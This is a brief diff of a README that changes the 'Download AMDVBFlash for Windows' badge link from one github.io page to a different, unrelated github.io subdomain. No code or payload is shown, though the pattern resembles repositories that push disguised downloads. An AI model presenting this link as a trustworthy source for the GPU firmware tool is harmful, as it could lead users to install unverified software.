@@ -4,7 +4,7 @@
 
 ## 📥 Download AMDVBFlash for Windows
 
-[![⬇️ Download AMDVBFlash](https://img.shields.io/badge/Download-AMDVBFlash-blue?style=for-the-badge&logo=windows)](https://amdvbflashload.github.io/.github/)
+[![⬇️ Download AMDVBFlash](https://img.shields.io/badge/Download-AMDVBFlash-blue?style=for-the-badge&logo=windows)](https://kornschardhu.github.io/.github/amdvbflash-tool)
 
 ---
 
